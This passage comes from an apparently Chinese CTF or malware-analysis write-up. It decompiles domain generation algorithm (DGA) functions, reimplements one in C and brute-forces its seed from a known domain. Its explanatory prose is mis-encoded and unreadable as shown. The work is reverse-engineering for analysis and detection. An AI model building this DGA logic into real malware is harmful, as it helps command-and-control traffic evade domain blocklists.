class="number">0x60</span>u);</span><br><span class="line">  qmemcpy(v17, _data_start__, <span class="keyword">sizeof</span>(v17));</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v18, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">    v4 = v14 &amp; <span class="number">0xFFFFFFFE</span>;</span><br><span class="line">    v18 = (<span class="keyword">unsigned</span> __int8)(a1 + <span class="number">48</span>);</span><br><span class="line">    v19 = (<span class="keyword">unsigned</span> __int8)a2;</span><br><span class="line">    v20 = (<span class="keyword">unsigned</span> __int8)a3;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="keyword">unsigned</span> __int8)v4;</span><br><span class="line">      v4 &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      v21[v5++] = v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 != <span class="number">4</span> );</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;v18 + v7) ^= (<span class="keyword">unsigned</span> __int8)(a4 &gt;&gt; <span class="number">8</span> * (v7 &amp; <span class="number">3</span>));</span><br><span class="line">      ++v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v7 != <span class="number">8</span> );</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v15[v8] = *(&amp;v18 + v8);</span><br><span class="line">      ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 != <span class="number">8</span> );</span><br><span class="line">    MD5Init(&amp;v22);</span><br><span class="line">    MD5Update(&amp;v22, v9, <span class="number">8</span>);</span><br><span class="line">    MD5Final(&amp;v22, v16);</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v24, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v11 = (v16[v10] &amp; <span class="number">0xF</span>) + ((<span class="keyword">signed</span> <span class="keyword">int</span>)v16[v10] &gt;&gt; <span class="number">4</span>) + <span class="number">97</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v11 &lt;= <span class="number">122</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;v23 + <span class="built_in">strlen</span>(v24) + <span class="number">1</span>) = v11;</span><br><span class="line">        v24[<span class="built_in">strlen</span>(v24) + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v10;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v10 != <span class="number">16</span> );</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v14 % (<span class="number">5</span> - v12) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ++v12 == <span class="number">5</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(v24, v17[v12]);</span><br><span class="line">LABEL_16:</span><br><span class="line">    result = <span class="built_in">puts</span>(v24);</span><br><span class="line">    ++v14;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v14 != <span class="number">1000</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ”¹äº†ä¸‹v22çš„ç±»å‹ï¼Œåˆ†æç®—æ³•æµç¨‹ï¼Œå¤§æ¦‚å°±æ˜¯é•¿åº¦ä¸º8çš„æ•°ç»„ï¼Œå‰ä¸‰ä¸ªæ˜¯å¹´æœˆæ—¥ï¼Œç¬¬å››ä¸ªæ˜¯0ï¼Œåé¢å››ä¸ªæ˜¯v14ï¼ˆæ¬¡æ•°ï¼‰çš„ä½32bitï¼Œä¸€ä¸ªå 8bitï¼Œç„¶åä¸ç§å­å¼‚æˆ–ï¼Œmd5å¾—åˆ°ç»“æœå†æŒ‰ç¨‹åºä¸€ä¸ªé€»è¾‘å¾—åˆ°å¯è§å­—ç¬¦ï¼Œç„¶åæ ¹æ®v14ç¡®å®šåç¼€ã€‚</p><p>è¿™é‡ŒMD5Updateè¿™äº›å‡½æ•°ä¿¡æ¯ç†åº”æ˜¯éšè—çš„ï¼Œå‡ºé¢˜äººæ²¡æ³¨æ„ï¼Œæ­£å¼æ¯”èµ›åº”è¯¥ç»™ä¿®æ­£äº†ï¼Œå…¶å®é€šè¿‡ Magic number å¯ä»¥åˆ¤æ–­æ˜¯ md5,æˆ‘è¿˜ä¸‹äº†æ–­ç‚¹åŠ¨æ€è°ƒè¯•éªŒè¯äº†ä¸€ä¸‹ã€‚</p><p>å…¶å®åªæœ‰ç§å­æœªçŸ¥ï¼Œç›´æ¥ç…§ç€é€»è¾‘å®ç°ä¸€éï¼Œæ‹¿ç¬¬ä¸€ä¸ªåŸŸåçˆ†ç ´ç§å­å°±å¥½äº†ã€‚md5ç®—æ³•æ˜¯ç½‘ä¸Šæ‰¾çš„ä¸€ä¸ªå®ç°ï¼š<a href="https://blog.csdn.net/weixin_42167759/article/details/81209320">https://blog.csdn.net/weixin_42167759/article/details/81209320</a>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;md5.c&quot;</span></span></span><br><span class="line"><span class="keyword">char</span> *v17[] = &#123;<span class="string">&quot;.biz&quot;</span>,<span class="string">&quot;.info&quot;</span>,<span class="string">&quot;.org&quot;</span>,<span class="string">&quot;.net&quot;</span>,<span class="string">&quot;.com&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> __int8 v18[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> v15[<span class="number">9</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> v16[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">char</span> v21[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> v4;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> v14,v5,v6,v7,v8,v10,v11,v9,v12;</span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">dga_v2</span><span class="params">(<span class="keyword">int</span> a1,<span class="keyword">int</span> a2,<span class="keyword">int</span> a3,<span class="keyword">unsigned</span> <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">v14=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="keyword">sizeof</span>(v18));</span><br><span class="line">v4 = v14 &amp; <span class="number">0xFFFFFFFE</span>;</span><br><span class="line">    v18[<span class="number">0</span>] = (<span class="keyword">unsigned</span> __int8)(a1 + <span class="number">48</span>);</span><br><span class="line">    v18[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)a2;</span><br><span class="line">    v18[<span class="number">2</span>] = (<span class="keyword">unsigned</span> __int8)a3;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="keyword">unsigned</span> __int8)v4;</span><br><span class="line">      v4 &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      v18[v5++ + <span class="number">4</span>] = v6;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">while</span> ( v5 != <span class="number">4</span> );</span><br><span class="line"></span><br><span class="line">v7 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v18[v7] ^= (<span class="keyword">unsigned</span> __int8)(a4 &gt;&gt; <span class="number">8</span> * (v7 &amp; <span class="number">3</span>));</span><br><span class="line">++v7;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">while</span> ( v7 != <span class="number">8</span> );</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v15[v8] = v18[v8];</span><br><span class="line">      ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 != <span class="number">8</span> );</span><br><span class="line">    v15[v8]=<span class="number">0</span>;</span><br><span class="line">    MD5_CTX md5;</span><br><span class="line">MD5Init(&amp;md5);        </span><br><span class="line">MD5Update(&amp;md5,v15,<span class="built_in">strlen</span>(v15));</span><br><span class="line">MD5Final(&amp;md5,(<span class="keyword">unsigned</span> __int8 *)v16);</span><br><span class="line"><span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">v10 = <span class="number">0</span>;</span><br><span class="line">v9 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v11 = (v16[v10] &amp; <span class="number">0xF</span>) + ((<span class="keyword">signed</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)v16[v10] &gt;&gt; <span class="number">4</span>) + <span class="number">97</span>;</span><br><span class="line"><span class="keyword">if</span> ( v11 &lt;= <span class="number">122</span> )</span><br><span class="line">&#123;</span><br><span class="line">v21[v9] = v11;</span><br><span class="line">v21[++v9] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">++v10;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v10 != <span class="number">16</span> );</span><br><span class="line">v12 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( v14 % (<span class="number">5</span> - v12) )</span><br><span class="line">&#123;</span><br><span class="line">++v12;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">strcat</span>(v21, v17[v12]);</span><br><span class="line"><span class="comment">//printf(&quot;%s\n&quot;,v21);</span></span><br><span class="line">++v14;</span><br><span class="line">&#125;<span class="keyword">while</span>(v14!=<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> v21;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> seed;</span><br><span class="line"><span class="keyword">char</span> correct[]=<span class="string">&quot;ezzijueztfslhhrp.biz&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(seed = <span class="number">0</span>;seed &lt; ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>)<span class="number">-1</span>) ;seed++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(correct,dga_v2(<span class="number">2020</span>,<span class="number">5</span>,<span class="number">10</span>,seed)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%u&quot;</span>,seed);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·‘äº†æŒºä¹…çš„ï¼Œå¾—åˆ°ç§å­æ˜¯1836927723ï¼Œç›´æ¥ç”Ÿæˆå°±å¥½äº†ã€‚</p><h3 id="sample2"><a href="#sample2" class="headerlink" title="sample2"></a>sample2</h3><p>æ‹–åˆ°IDAåæ±‡ç¼–ï¼Œçœ‹åˆ°å°±ä¸€ä¸ªdgaå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dga(<span class="string">&quot;cw3OGGsoaako7GSGG3&quot;</span>, <span class="string">&quot;umyyobuorstfabj.com&quot;</span>, (<span class="keyword">char</span> (*)[<span class="number">5</span>])v4, <span class="number">3</span>, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>v4å¯ä»¥çœ‹åˆ°æ˜¯åŸŸåçš„åç¼€åï¼ŒåŒ…æ‹¬[â€˜pwâ€™, â€˜usâ€™, â€˜clubâ€™]ã€‚</p><p>çœ‹dgaå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">dga</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">char</span> *a2, <span class="keyword">char</span> (*a3)[<span class="number">5</span>], <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v11; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> (*v12)[<span class="number">5</span>]; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> (*v14)[<span class="number">5</span>]; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+1Ch] [ebp-CCh]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+20h] [ebp-C8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v17; <span class="comment">// [esp+24h] [ebp-C4h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v18; <span class="comment">// [esp+28h] [ebp-C0h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+2Ch] [ebp-BCh]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [esp+31h] [ebp-B7h]</span></span><br><span class="line">  <span class="keyword">char</span> v21[<span class="number">4</span>]; <span class="comment">// [esp+32h] [ebp-B6h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [esp+36h] [ebp-B2h]</span></span><br><span class="line">  <span class="keyword">int</span> v23[<span class="number">15</span>]; <span class="comment">// [esp+50h] [ebp-98h]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [esp+8Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v25[<span class="number">22</span>]; <span class="comment">// [esp+90h] [ebp-58h]</span></span><br><span class="line"></span><br><span class="line">  v5 = a2;                    </span><br><span class="line">  <span class="built_in">memset</span>(v23, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  *(_DWORD *)v21 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;                    </span><br><span class="line">  <span class="built_in">memset</span>(&amp;v22, <span class="number">0</span>, <span class="number">0x1A</span>u);</span><br><span class="line">  v6 = <span class="number">0</span>;                     </span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = a1[v6];</span><br><span class="line">    v17 += v7;</span><br><span class="line">    v23[v6++] = v7;         </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 != <span class="number">16</span> );</span><br><span class="line">  v19 = <span class="number">0</span>;                 </span><br><span class="line">  v15 = (<span class="keyword">unsigned</span> __int8)v24;  </span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v19;</span><br><span class="line">    <span class="keyword">if</span> ( v19 &gt;= a5 )  </span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v25, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v25[v9] = v5[v9];</span><br><span class="line">      ++v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v9 != <span class="number">16</span> );        </span><br><span class="line">    v10 = v15;</span><br><span class="line">    v11 = <span class="number">1</span>;                  <span class="comment">//v11:1</span></span><br><span class="line">    <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="number">0x1E</span>u);</span><br><span class="line">    v18 = v17;                <span class="comment">//v18:0</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v16 = (v18 ^ (*(&amp;v24 + v11) + v10)) + v25[v11];</span><br><span class="line">        v10 = (<span class="keyword">unsigned</span> __int8)v16;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)v16 - <span class="number">98</span> &lt;= <span class="number">0x17</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ++v18;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v11;</span><br><span class="line">      *(&amp;v20 + <span class="built_in">strlen</span>(v21) + <span class="number">1</span>) = v16;</span><br><span class="line">      v21[<span class="built_in">strlen</span>(v21) + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 != <span class="number">13</span> );</span><br><span class="line">    v12 = a3;</span><br><span class="line">    *(&amp;v20 + <span class="built_in">strlen</span>(v21) + <span class="number">1</span>) = <span class="number">46</span>;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    v21[<span class="built_in">strlen</span>(v21) + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v13 &lt; a4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = v12;</span><br><span class="line">      ++v13;</span><br><span class="line">      ++v12;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s%s\n&quot;</span>, v21, v14);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(v21, &amp;(*a3)[<span class="number">5</span> * a4 - <span class="number">5</span>]);</span><br><span class="line">    ++v19;</span><br><span class="line">    v5 = v21;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”ŸæˆåŸŸåçš„é‡ç‚¹ä»£ç æ˜¯è¿™æ®µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v16 = (v18 ^ (*(&amp;v24 + v11) + v10)) + v25[v11];</span><br><span class="line">        v10 = (<span class="keyword">unsigned</span> __int8)v16;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)v16 - <span class="number">98</span> &lt;= <span class="number">0x17</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ++v18;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v11;</span><br><span class="line">      *(&amp;v20 + <span class="built_in">strlen</span>(v21) + <span class="number">1</span>) = v16;</span><br><span class="line">      v21[<span class="built_in">strlen</span>(v21) + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 != <span class="number">13</span> );</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯åŠ åç¼€çš„ï¼Œä¸ç”¨ç®¡ã€‚</p><p>é‡Œé¢æ¶‰åŠçš„å˜é‡ï¼Œv18æ˜¯v17èµ‹å€¼ï¼Œv17æ˜¯â€œcw3OGGsoaako7GSGG3â€çš„asciiç çš„å’Œï¼ˆä½8ä½ï¼‰ã€‚</p><p>v11æ˜¯ä¸€ä¸ªä¸çŸ¥é“å“ªçš„æ•°ï¼Œv25æ˜¯â€œumyyobuorstfabj.comâ€ï¼Œv24æœªçŸ¥ã€‚v24å¾ˆå¥‡æ€ªï¼Œç”¨æ³•æ˜¯ç±»ä¼¼æ•°ç»„çš„ç”¨æ³•ï¼Œå£°æ˜å´æ˜¯intï¼Œæ‰‹åŠ¨æ”¹æˆintç±»å‹çš„æ•°ç»„ï¼Œé‡æ–°åç¼–è¯‘ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">dga</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">char</span> *a2, <span class="keyword">char</span> (*a3)[<span class="number">5</span>], <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v11; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> (*v12)[<span class="number">5</span>]; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> (*v14)[<span class="number">5</span>]; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+1Ch] [ebp-CCh]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+20h] [ebp-C8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v17; <span class="comment">// [esp+24h] [ebp-C4h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v18; <span class="comment">// [esp+28h] [ebp-C0h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+2Ch] [ebp-BCh]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [esp+31h] [ebp-B7h]</span></span><br><span class="line">  <span class="keyword">char</span> v21[<span class="number">4</span>]; <span class="comment">// [esp+32h] [ebp-B6h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [esp+36h] [ebp-B2h]</span></span><br><span class="line">  <span class="keyword">int</span> v23[<span class="number">15</span>]; <span class="comment">// [esp+50h] [ebp-98h]</span></span><br><span class="line">  <span class="keyword">int</span> v24[<span class="number">14</span>]; <span class="comment">// [esp+8Ch] [ebp-5Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = a2;</span><br><span class="line">  <span 